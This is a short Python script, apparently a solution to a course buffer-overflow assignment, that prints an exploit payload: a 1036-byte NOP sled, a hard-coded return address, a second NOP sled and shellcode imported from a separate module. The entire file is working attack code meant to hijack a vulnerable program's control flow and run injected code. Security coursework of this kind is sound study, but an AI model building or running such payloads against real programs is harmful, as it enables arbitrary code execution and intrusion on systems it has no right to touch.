#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"\x90" * 1036)
sys.stdout.buffer.write(pack("<I", 0xfffe8e04))
sys.stdout.buffer.write(b"\x90" * 600)
sys.stdout.buffer.write(shellcode)
